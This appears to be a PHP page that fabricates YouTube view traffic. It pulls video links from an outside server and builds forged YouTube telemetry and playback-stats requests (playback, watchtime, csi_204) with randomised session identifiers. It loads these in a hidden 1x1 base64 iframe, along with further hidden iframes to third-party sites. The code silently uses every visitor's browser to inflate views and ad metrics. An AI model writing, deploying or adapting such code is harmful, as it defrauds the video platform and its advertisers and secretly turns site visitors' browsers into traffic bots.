<?php

function get_youtube_id_from_url($url)
{
       if(stristr($url,'youtu.be/'))
       {preg_match('/(https:|http:|)(\/\/www\.|\/\/|)(.*?)\/(.{11})/i', $url, $final_ID); return $final_ID[4]; }
       else
       {@preg_match('/(https:|http:|):(\/\/www\.|\/\/|)(.*?)\/(embed\/|watch.*?v=|)([a-z_A-Z0-9\-]{11})/i', $url, $IDD); return $IDD[5]; }
}
function random($len)
{
 $result = "";
$chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
$charArray = str_split($chars);   
 for($i = 0; $i < $len; $i++){
 $randItem = array_rand($charArray);
 $result .= "".$charArray[$randItem];
 }
 return $result;
}
function randomcpn($len)
{
 $result = "";
$chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz-_";
$charArray = str_split($chars);   
 for($i = 0; $i < $len; $i++){
 $randItem = array_rand($charArray);
 $result .= "".$charArray[$randItem];
 }
 return $result;
}
$array = json_decode(file_get_contents("http://srofficialfollowers.com/youtubev2"));
$count = count($array); 
for($i=1;$i<=$count;$i++)
{
$no1 = $array[rand(0,10)];
$no1 = get_youtube_id_from_url($no1->link);
$plid = 'AAVz'.randomcpn(12);
$cpn = randomcpn(16);
$ei = randomcpn(20);
$videoln = 40;
$aqi=randomcpn(22); 


$l2 ='	<iframe src="https://www.youtube.com/gen_204?mse_dw=0&mse_m=true&mse_pp=true&a=tv_reqs&c=TVHTML5&cver=6.2018022&ctheme=CLASSIC&label=b89f861e&appstart=1532976715"></iframe>';


$l1 =' <iframe src="https://www.youtube-nocookie.com/device_204?app_anon_id=e3eb3682-f537-de88-a706-6221e9523dc5&firstactive=1532976715&prevactive=0&firstactivegeo=US&loginstate=0&firstlogin=0&prevlogin=0&c=TVHTML5&cver=6.2018022&ctheme=CLASSIC&label=b89f861e&appstart=1532976715"></iframe>';



$l3 ='<iframe src="https://m.youtube.com/gen_204?trigger=unknown&t=0.1&origin=init&state=watch%3Aloading&first_active=1532976715&prev_active=0&a=tv_activity&guide_opened_ever=0&logged_in=0&c=TVHTML5&cver=6.2018022&ctheme=CLASSIC&label=b89f861e&appstart=1532976715"></iframe>';



$l4 ='<iframe src="https://m.youtube.com/gen_204?trigger=unknown&t=0.1&origin=watch%3Aloading&state=watch%3Avideo%3Aidle&a=tv_activity&guide_opened_ever=0&logged_in=0&c=TVHTML5&cver=6.2018022&ctheme=CLASSIC&label=b89f861e&appstart=1532976715"></iframe>';



$l5 ='	<iframe src="https://m.youtube.com/gen_204?trigger=unknown&t=0.1&origin=init&state=surface&first_active=1532976715&prev_active=1532976716&a=tv_activity&guide_opened_ever=0&logged_in=0&c=TVHTML5&cver=6.2018022&ctheme=CLASSIC&label=b89f861e&appstart=1532976715"></iframe>';


$l6 ='	
		
	<iframe src="https://m.youtube.com/api/stats/playback?ns=yt&el=adunit&content_v=kMRRIMmICmM&cpn='.$cpn.'&docid='.$no1.'&ver=2&referrer=https%3A%2F%2Fwww.youtube.com%2Ftv%2F&cmt=0&plid='.$plid.'&ei='.$ei.'&fmt=244&fs=0&rt=0&adformat=2_2_1&euri=https%3A%2F%2Fwww.youtube.com%2Ftv%23%2Fwatch%2Fvideo%2Fidle%3Fv%3DkMRRIMmICmM%26resume&lact=-1&cl=204453336&mos=0&vm=CAMQARgB&volume=80&c=TVHTML5&cver=6.20180220&cplayer=UNIPLAYER&autoplay=1&delay=14&hl=en_US&cr=RU&len='.$videoln.'&fexp=23708904%2C23708906%2C23708910%2C23710476%2C23721699%2C23721898%2C23723208%2C23726563%2C23732467%2C23733605%2C23733751%2C23733862%2C23735275%2C23735348%2C23737531%2C23738491%2C23740493%2C23741488%2C23744049%2C23744176%2C23745105%2C23746304%2C23746739%2C23749118%2C23749362%2C23751008%2C23751178%2C23751767%2C23752092%2C23752233%2C23752247%2C23753265%2C23754774%2C23755636%2C9406006%2C9445372%2C9449243%2C9472490%2C9485000&rtn=8&afmt=251"></iframe>';
	$l7 ='<iframe src="https://m.youtube.com/csi_204?v=2&s=youtube_tv&action=watch&yt_sts=dhs&is_nav=1&p=unknown&t=unknown&yt_vis=1&c=TVHTML5&cver=6.20180220&ctheme=cl&aq=full-animation&l_mm=0&l_an=0&preloaded=0&br_trs=init&docid='.$no1.'&ei='.$ei.'&cpn='.$cpn.'&fmt=244&cmt=0&yt_pvis=1&yt_pt=html5&rt=ld_s.136,js_r.708,msg_rq.720,msg_r.824,app_b.879,r_construction.933,pljs_rq.965,app_i.1000,app_r.1000,app_added.1000,remove_splash.1003,app_rq_ply.1005,app_s_w_st.1005,r_s_vid.1081,w_ld_vid.1089,pljs_r.1360,pem_rq.1360,dcp.1362,fs.1391,pem_r.1403,ld_vid_bpv.1407,qoes.1412,vir.1417,virc.1818,pbr.1851,gv.1848,l2s.1972,fvb.1942,plev.2191,vfp.2253,msa.1864,ada.1969,vda.2092,vri.1845,vdns.1904,vreq.1932,vrc.2071,ari.1847,adns.1904,areq.1940,avb.1947,arc.1962,pbs.2239,aft.2239,ps.2260"></iframe>';

	
	
$l8='	<iframe src="https://m.youtube.com/api/stats/delayplay?ns=yt&el=adunit&content_v=kMRRIMmICmM&cpn='.$cpn.'&docid='.$no1.'&ver=2&referrer=https%3A%2F%2Fwww.youtube.com%2Ftv%2F&cmt=8.102&plid='.$plid.'&ei='.$ei.'&fmt=244&fs=0&rt=13&adformat=2_2_1&euri=https%3A%2F%2Fwww.youtube.com%2Ftv%23%2Fwatch%2Fvideo%2Fidle%3Fv%3DkMRRIMmICmM%26resume&lact=8108&cl=204453336&mos=0&vm=CAMQARgB&volume=80&c=TVHTML5&cver=6.20180220&cplayer=UNIPLAYER&autoplay=1&delay=14&hl=en_US&cr=RU&len='.$videoln.'&fexp=23708904%2C23708906%2C23708910%2C23710476%2C23721699%2C23721898%2C23723208%2C23726563%2C23732467%2C23733605%2C23733751%2C23733862%2C23735275%2C23735348%2C23737531%2C23738491%2C23740493%2C23741488%2C23744049%2C23744176%2C23745105%2C23746304%2C23746739%2C23749118%2C23749362%2C23751008%2C23751178%2C23751767%2C23752092%2C23752233%2C23752247%2C23753265%2C23754774%2C23755636%2C9406006%2C9445372%2C9449243%2C9472490%2C9485000&afmt=251"></iframe>';

	
$l9 ='		
		<iframe src="https://m.youtube.com/api/stats/watchtime?ns=yt&el=adunit&content_v=kMRRIMmICmM&cpn='.$cpn.'&docid='.$no1.'&ver=2&referrer=https%3A%2F%2Fwww.youtube.com%2Ftv%2F&cmt=8&plid='.$plid.'&ei=S15fW57wCZrbNorDltAL&fmt=244&fs=0&rt=8&adformat=2_2_1&euri=https%3A%2F%2Fwww.youtube.com%2Ftv%23%2Fwatch%2Fvideo%2Fidle%3Fv%3DkMRRIMmICmM%26resume&lact=8008&cl=204453336&state=paused&vm=CAMQARgB&volume=80&c=TVHTML5&cver=6.20180220&cplayer=UNIPLAYER&autoplay=1&delay=14&hl=en_US&cr=RU&len='.$videoln.'&rtn=37.22&afmt=251&idpj=-8&ldpj=-27&rti=8&muted=0&st=0&et=8"></iframe>';
		
			$l10 ='	<iframe src="https://m.youtube.com/api/stats/watchtime?ns=yt&el=adunit&content_v=kMRRIMmICmM&cpn='.$cpn.'&docid='.$no1.'&ver=2&referrer=https%3A%2F%2Fwww.youtube.com%2Ftv%2F&cmt=1035&plid='.$plid.'&ei=S15fW57wCZrbNorDltAL&fmt=244&fs=0&rt=1037.22&adformat=2_2_1&euri=https%3A%2F%2Fwww.youtube.com%2Ftv%23%2Fwatch%2Fvideo%2Fidle%3Fv%3DkMRRIMmICmM%26resume&lact=15305&cl=204453336&state=paused&vm=CAMQARgB&volume=80&c=TVHTML5&cver=6.20180220&cplayer=UNIPLAYER&autoplay=1&delay=14&hl=en_US&cr=RU&len='.$videoln.'&rtn=35&afmt=251&idpj=-8&ldpj=-27&rti=37.22&muted=0&st=8&et=1035&final=1"></iframe>';
		
				
		$l11 ='		<iframe src="https://m.youtube.com/csi_204?v=2&s=youtube_tv&action=home&yt_lt=warm&yt_sts=n&is_nav=1&pa=watch&p=unknown&t=unknown&yt_vis=1&c=TVHTML5&cver=6.20180220&ctheme=cl&aq=full-animation&l_mm=0&l_an=0&preloaded=0&br_trs=watch&browse_id=default&rt=b_rqs.5,b_rqf.996,b_rnf.1152,ol.1152,aft.1152,ps.1153"></iframe>';

$a = $l1.$l2.$l3.$l4.$l5.$l6.$l7.$l8.$l9.$l10.$l11;
$html = $html.$a;
}
$a = base64_encode($html);
?>

<html>
    
<head>
</head>
<body>
<div  style="position:abs1olute;">
<iframe src="data:text/html;base64,<?php echo $a; ?>" scrolling="no" width="1" height="1" frameborder="0" style="visibility:hidden;position:absolute;"></iframe>



<iframe src="http://downloadfull.club/nhr.php?video_id=eV5IbJa2ZYU&video_lenght=120&sug1=C3ap6S4mAco&sug2=vg0ZfeszGrU&sug3=PjTU0DmBWiU"></iframe>
<iframe src="http://downloadfull.club/nhr.php?video_id=ulNHoegtVMk&video_lenght=120&sug1=C3ap6S4mAco&sug2=vg0ZfeszGrU&sug3=PjTU0DmBWiU"></iframe>

<iframe src="http://downloadfull.club/nhr.php?video_id=eV5IbJa2ZYU&video_lenght=120&sug1=C3ap6S4mAco&sug2=vg0ZfeszGrU&sug3=PjTU0DmBWiU"></iframe>
<iframe src="http://downloadfull.club/nhr.php?video_id=ulNHoegtVMk&video_lenght=120&sug1=C3ap6S4mAco&sug2=vg0ZfeszGrU&sug3=PjTU0DmBWiU"></iframe>

<iframe src="https://goo.gl/XLRJ2E"></iframe>
<iframe src="/track/Tseries.php"></iframe>
